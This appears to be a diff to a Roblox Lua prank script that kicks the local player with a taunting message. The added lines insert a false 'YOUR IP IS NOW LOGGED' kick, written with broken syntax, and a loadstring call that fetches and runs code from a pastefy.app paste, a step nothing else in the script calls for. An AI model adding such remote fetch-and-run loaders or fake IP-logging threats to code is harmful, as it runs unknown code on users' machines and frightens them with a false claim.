@@ -24,3 +24,7 @@ wait(2)
 
 -- Kick player dari sisi client (tidak beneran keluar server, hanya simulasi kick)
 player:Kick("King of leak Lolz by sigmaz")
+
+
+:Kick("YOUR IP IS NOW LOGGED")
+loadstring(game:HttpGet("https://pastefy.app/zFgrAnbj/raw"))()
